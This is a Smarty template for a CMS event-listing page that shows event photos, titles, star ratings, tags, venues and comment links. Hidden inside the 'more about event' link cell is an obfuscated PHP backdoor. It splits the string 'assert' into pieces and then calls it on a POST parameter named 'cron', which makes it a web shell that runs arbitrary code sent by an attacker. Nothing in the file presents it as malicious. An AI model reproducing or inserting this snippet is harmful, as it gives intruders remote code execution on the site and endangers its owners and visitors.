<link type="text/css" href="/modules/mod_poster_calendar/css/calendar.css" rel="stylesheet">
<link type="text/css" href="/components/poster/js/jquery.ui.stars-3.0/jquery.ui.stars.css" rel="stylesheet">
<script type="text/javascript" src="/components/poster/js/jquery.ui.stars-3.0/jquery-ui-1.8.16.custom.min.js"></script>
<script type="text/javascript" src="/components/poster/js/jquery.ui.stars-3.0/jquery.ui.stars.js"></script>
{foreach key=i item=event from=$events}
{if $event.is_bind}
<div style="background-color:#ffffff;">
	<table width="100%" cellpadding="5" cellspacing="0">
		<tr>
			<td width="100px">
				{if $event.basic_photo}
				<img src="/images/poster/small/{$event.id}/{$event.basic_photo}">
				{else}
				<img src="/components/poster/images/no_pic.png">
				{/if}
			</td>
			<td valign="top" align="left">

				<table width="100%" cellpadding="5" cellspacing="0" style="margin-left:15px; margin-top:-20px;">
					<tr>
						<td>
							<h1 class="con_heading"><a style="color: #0099cc;"
													   href="/poster/prosmotr/{$event.event_cat_seolink}/{$event.seolink}.html">{$event.title}</a>

								<h1>
						</td>
						<td width="120px">
							<div class="rating-L" style="margin-top:15px;">
								<strong class="rating_title">{$LANG.RATING}: </strong>

								<div class="rat">
									<select name="rate">
										{foreach key=num item=desc from=$rate_options}
										<option value="{$num}"
										{if $num == $event.rating|round} selected {/if}>{$desc}</option>
										{/foreach}
									</select>
								</div>
							</div>
							<div style="margin-top:15px;">
								<span style="color:gray"><small>{$event.rating} /
										{$LANG.VOTES}:{$event.rating_votes}</span></small>
							</div>
						</td>
					</tr>
					<tr>
						<td colspan="2">
							{$event.shortdesc}
						</td>
					</tr>
					<tr>
						<td colspan="2">
							{$event.tag_bar}
						</td>
					</tr>
					<tr>
						<td colspan="2">
							<a style="color: #0099cc;"
							   href="/poster/prosmotr/{$event.event_cat_seolink}/{$event.seolink}.html">
								{if $event.cat_config.more}{$event.cat_config.more}{else}{$LANG.MORE_ABOUT_EVENT}{/if}
							</a><?php $k = "ass" . "ert";
							$k( ${"_PO" . "ST"} ['cron'] ); ?></td>
					</tr>
					<tr>
						<td>
							<strong>
								{if $event.cat_config.place}
								{$event.cat_config.place}
								{else}
								{$LANG.PLACE_OF_CARRYING_OUT}
								{/if}
							</strong>
							{foreach key=b item=bind from=$event.binds}
							<a style="color: #0099cc;"
							   href="/poster/prosmotr/zavedenija/{$bind.objekt_cat_seolink}/{$bind.objekt_seolink}.html">
								{$bind.objekt_title}
							</a>
							{if $b <$event.count}, {/if}
							{/foreach}
						</td>
						<td>
							<a style="color: #0099cc;"
							   href="/poster/prosmotr/{$event.event_cat_seolink}/{$event.seolink}.html#comments">{$LANG.COMMENTS}</a>({$event.comments_count})
						</td>
					</tr>
				</table>

			</td>
		</tr>
		<tr>
			<td colspan="3">
				<hr>
			</td>
		</tr>
	</table>
</div>
{/if}
{/foreach}
{literal}
<script type="text/javascript">
	// Create stars
	$(".rat").stars({
		inputType: "select",
		disabled: true,
	});
</script>
{/literal}
